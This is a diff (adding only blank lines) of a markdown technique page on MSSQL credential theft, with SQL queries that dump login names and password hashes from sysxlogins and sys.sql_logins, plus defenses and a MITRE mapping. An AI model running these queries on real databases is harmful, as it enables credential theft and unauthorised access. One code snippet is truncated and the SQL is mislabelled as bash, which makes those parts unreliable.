@@ -37,6 +37,9 @@ MSSQL Credential Theft is a technique used by attackers to extract login credent
 
 From a technical perspective, attackers can use SQL injection to inject malicious code into an SQL query that extracts login credentials from the database. This technique can be used to extract usernames and passwords from the database, which can be used to gain access to other systems or applications. The business value of this attack is that attackers can gain access to sensitive information and systems, which can result in financial loss, reputation damage, and legal consequences.
 
+
+ 
+
 ## Requirements
 
 1. Access to the network
@@ -44,6 +47,8 @@ From a technical perspective, attackers can use SQL injection to inject maliciou
 1. Knowledge of SQL injection techniques
 
 1. Access to a MSSQL database
+
+ 
 
 ## Defense
 
@@ -53,11 +58,15 @@ From a technical perspective, attackers can use SQL injection to inject maliciou
 
 1. Use strong and unique passwords for MSSQL login credentials
 
+ 
+
 ## Objectives
 
 1. Extract MSSQL login credentials
 
 1. Gain access to other systems or applications that use the same login credentials
+
+ 
 
 # Instructions
 
@@ -70,10 +79,18 @@ For MSSQL 2005:
 1. SELECT name, password_hash FROM master.sys.sql_logins
 2. SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
 
+ 
+
+
+
 **Code**: [[MSSQL 2000:
 SELECT name, password FROM master..sys]]
 
+
+
 > The above commands can be used to retrieve login credentials from MSSQL databases. The first command retrieves the name and password of all users in the database. The second command is specifically for MSSQL 2000 and converts the password to hex to return hashes in MSSQL error message or some version of query analyzer. The third command retrieves the name and password hash of all users in the database. The fourth command is specifically for MSSQL 2005 and concatenates the name and password hash for easier viewing.
+
+
 
 **Command** ([[Retrieve name and password from sysxlogins table in MSSQL 2000]]):
 
@@ -81,11 +98,19 @@ SELECT name, password FROM master..sys]]
 SELECT name, password FROM master..sysxlogins
 ```
 
+
+
+
+
 **Command** ([[Retrieve name and password hash from sysxlogins table in MSSQL 2000]]):
 
 ```bash
 SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
 ```
+
+
+
+
 
 **Command** ([[Retrieve name and password hash from sql_logins table in MSSQL 2005]]):
 
@@ -93,11 +118,17 @@ SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
 SELECT name, password_hash FROM master.sys.sql_logins
 ```
 
+
+
+
+
 **Command** ([[Retrieve name and password hash (converted to hex) from sql_logins table in MSSQL 2005]]):
 
 ```bash
 SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -122,3 +153,5 @@ SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.
 
 - [[MSSQL Extract user/password]]
 - [[MSSQL Injection]]
+
+
